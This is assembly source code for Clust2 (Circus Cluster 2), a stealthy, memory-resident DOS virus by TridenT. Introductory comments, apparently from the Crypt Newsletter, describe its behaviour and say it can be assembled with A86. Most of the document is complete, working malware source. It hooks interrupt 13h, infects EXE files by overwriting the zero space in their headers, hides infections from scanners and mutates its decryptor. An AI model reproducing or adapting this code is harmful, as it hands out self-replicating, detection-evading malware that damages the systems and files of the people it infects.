;The Circus Cluster 2 virus is an experiment which TridenT finished after
;the original Cluster virus was published in Crypt 17. The source
;code in its original form is provided now.
;
;Credited to TridenT, Circus Cluster 2 uses some of
;the ideas of the Bulgarian virus known as The Rat.  The Rat was deemed
;tricky because it looked for "00" empty space below the header in
;an EXEfile - if it found enough room for itself, it wrote itself out
;to the empty space or "air" in the file.  This hid the virus in the 
;file, but added no change in file size.  This is a nice theme - one
;made famous by the ZeroHunt virus which first did the same with
;.COMfiles.  In both cases, the viruses had to be picky about the
;files they infected, limiting their spread.  This is still true with
;Circus Cluster 2 - it's an effective virus, but an extremely picky
;one.
;
;First, Circus Cluster 2 will attempt to copy itself into
;the "air" in an EXEfile just below the file header, if there is
;enough room.  The most common candidates for infection are standard
;MS/PC-DOS utility programs, like FIND or FC, among others.
;
;
;
;Because Circus Cluster installs its own INT 13 disk hander, it then can
;intercept all attempts to read from files for a quick look.
;For example, looking at a hex dump of a Cluster-infected .EXE,
;with Vern Berg's LIST, will show the files clean.  Now, boot
;the system clean and look again.  You'll see Cluster in the file's
;"00" space.
;
;Additional notes by Black Wolf & Urnst Kouch
;Crypt Newsletter 22. Circus Cluster 2 can be quickly assembled with
;the A86 shareware assembler.
;----------------------------------------------------------------------
;
; Clust2 virus by John Tardy / TridenT
;
; Virus Name:  Clust2
; Aliases:     Cluster-II, Circus Clusters-II
; V Status:    Released
; Discovery:   Not (yet)
; Symptoms:    .EXE altered, possible "sector not found" errors on disk-drives,
;              decrease in aveable memory
; Origin:      The Netherlands
; Eff Length:  386 bytes (EXE size doesn't change)
; Type Code:   ORhE - Overwriting Resident .EXE Infector
; Detection Method:
; Removal Instructions: Delete infected files or copy infected files with the
;                       virus resident to a device driven unit.
;
; General Comments:
; The Clust2 virus is not yet submitted to any antiviral authority. It
; is from the TridenT Virus Research Centre and was written by someone
; calling himself John Tardy. When an infected program is started, Clust2
; will become resident in high memory, but below TOM. It hooks interrupt
; 13h and will try to load the program again. Because of its stealth
; abilities the original program is loaded and will execute normally.
; The Clust2 virus infects files when a write request for interrupt 13h
; is done. It will check if the buffer contains the 'MZ' signature and
; that the candidate file isn't larger than 65000 bytes, and if there are
; enough zeros in the EXE-header. If these conditions are met, Clust2
; will convert the EXE file to a COM file and inserts its code in the
; buffer, allowing the original write request to proceed. This way it
; evades critical errors. The Clust2 virus is also stealth and can't be
; detected with virus scanners or checksumming software if the virus is
; resident. File-length and date doesn't change regardless if Clust2
; is resident. It's also a slighty polymorphic virus, mutating a few
; bytes in its decryptor. A wildcarded search string is needed to find it.
; The following text is encrypted within the
; virus:
;
;        "[Clust2]"
;        "JT / TridenT"
;
; The Clust2 virus will not infect files on device driven units, like drives
; compressed with DoubleSpace. It will disinfect itself on the fly
; when copied to such a device.
;
; Sometimes it will issue a "sector not found" error when a file is
; copied to a disk drive.
;
; The Clust2 virus doesn't do anything beside replicate.
;
		ORG     100H

JUMPIE:         JMP     SHORT JUMPER

		ORG     180H

JUMPER:         CLC
		MOV     CX,DECRLEN
MORPH           EQU     $-2
JASS:           LEA     SI,DECR
DECRYPT:        XOR     BYTE PTR [SI],0
TRIG            EQU     $-1
TRAG            EQU     $-2
TROG:           INC     SI
TREG:           LOOP    DECRYPT

DECR:           MOV     AX,3513H    
		INT     21H         ; return interrupt 13h handler
		MOV     OLD13,BX    ; segment: offset
		MOV     OLD13[2],ES
		MOV     AX,ES:[BX]
		CMP     AX,0FC80H   ; compare with virus ID
		JE      EXIT        ; terminate if virus resident

DOINST:         MOV     AH,0DH       ; empty disk buffers
		INT     21H

		MOV     AX,CS
		DEC     AX
		MOV     DS,AX
		CMP     BYTE PTR DS:[0],'Z'   ; last chain?
		JNE     EXIT                  ; if not, terminate
RESIT:          SUB     WORD PTR DS:[3],VIRPAR+19H   ; subtract from MCB size
		SUB     WORD PTR DS:[12H],VIRPAR+19H ; subtract from
		LEA     SI,JUMPER                    ; PSP top of memory
		MOV     DI,SI
		MOV     ES,DS:[12H]                  ; ES = new segment
		MOV     DS,CS
		MOV     CX,VIRLEN                    ; virus length
		REP     MOVSB                        ; copy it into memory

		MOV     AX,2513H                     ;
		MOV     DS,ES
		LEA     DX,NEW13                     ; set interrupt 13h 
		INT     21H                          ; into virus

		PUSH    CS
		POP     ES
		MOV     BX,100H
		MOV     SP,BX
		MOV     AH,4AH
		INT     21H           ; modify memory allocation
		PUSH    CS
		POP     DS
		MOV     BX,DS:[2CH]
		MOV     ES,BX
		MOV     AH,49H
		INT     21H

		XOR     AX,AX
		MOV     DI,1
SEEK:           DEC     DI       ; seek for file executed
		SCASW            ; in environment
		JNE     SEEK     ; located after two 0's

		LEA     SI,DS:[DI+2]
EXEC:           PUSH    BX
		PUSH    CS
		POP     DS                ; ds = environment segment
		MOV     BX,OFFSET PARAM
		MOV     DS:[BX+4],CS
		MOV     DS:[BX+8],CS
		MOV     DS:[BX+12],CS
		POP     DS
		PUSH    CS
		POP     ES

		MOV     DI,OFFSET FILENAME
		PUSH    DI
		MOV     CX,40
		REP     MOVSW
		PUSH    CS
		POP     DS

		POP     DX

		MOV     AX,4B00H    ; load & execute file 
		INT     21H
EXIT:           MOV     AH,4DH      ; 
		INT     21H
		MOV     AH,4CH
		INT     21H

OLD13           DW      0,0

ORG13:          JMP     D CS:[OLD13]    ; jump to old interrupt 13h

NEW13:          CMP     AH,3            ; is there a write to the disk?
		JE      CHECKEXE        ; if so, check for infection op.
		CMP     AH,2            ; is it a disk read?
		JNE     ORG13           ; if not, to original int 13h
DO:             PUSHF
		CALL    D CS:[OLD13]    ; call interrupt 13h
		CMP     ES:[BX],7EEBH   ; is sector infected?
		JNE     ERROR
		MOV     ES:[BX],'ZM'    ; cover virus ID with 'MZ'
		PUSH    DI
		PUSH    CX
		PUSH    AX

		MOV     CX,VIRLEN
		XOR     AX,AX
		LEA     DI,BX[80H]     ; hash virus from sector when read
		REP     STOSB

		POP     AX
		POP     CX
		POP     DI
ERROR:          IRET

CHECKEXE:       CMP     ES:[BX],'ZM'   ; is an .EXEfile being written?
		JNE     ORG13          ; to original address if not

		CMP     W ES:BX[4],(65000/512) ; is .EXEfile too large to
		JNB     ORG13                  ; convert? Compare with value
					       ; = max size (6500) divided by
					       ; sector size
		PUSH    AX
		PUSH    CX
		PUSH    SI
		PUSH    DI
		PUSH    DS

		PUSH    ES
		POP     DS
		LEA     SI,BX[80H]        ; look in the .EXEfile header
		MOV     DI,SI
		MOV     CX,VIRLEN
FIND0:          LODSB
		OR      AL,AL
		LOOPE   FIND0            ; check if field was hashed to 0's
		OR      CX,CX            ; and exit
		JNE     NO0              ; if not

		XOR     AX,AX
		MOV     DS,AX
		MOV     AX,DS:[046CH]
		PUSH    CS
		POP     DS
		TEST    AH,1
		JZ      NOLOOPFLIP
		XOR     B TREG,2
NOLOOPFLIP:     TEST    AH,2
		JZ      NOCLCFLIP
		XOR     B JUMPER,1
NOCLCFLIP:
		ADD     AX,VIRLEN
		SHR     AX,1
		MOV     W MORPH,AX
		MOV     B TRIG,AH
		XOR     B TRAG,1
		XOR     B JASS,1
		XOR     B TROG,1
		MOV     CX,CRYPT
		LEA     SI,JUMPER
		REP     MOVSB
		MOV     CX,DECRLEN
		LEA     SI,DECR
CODEIT:         LODSB
		XOR     AL,AH
		STOSB                   ; copy virus over 'air' in EXEheader
		LOOP    CODEIT          ; after encrypting
		MOV     DI,BX
		MOV     AX,07EEBH        ; insert jmp over original 'MZ'
		STOSW

NO0:            POP     DS
		POP     DI
		POP     SI
		POP     CX
		POP     AX
		JMP     ORG13

		DB      '[Clust2]'

PARAM           DW      0,80H,?,5CH,?,6CH,?

		DB      'JT / TridenT'

FILENAME        EQU     $
DECRLEN         EQU     $-DECR
CRYPT           EQU     DECR-JUMPER
VIRLEN          EQU     $-JUMPER
VIRPAR          EQU     ($-JUMPER)/16


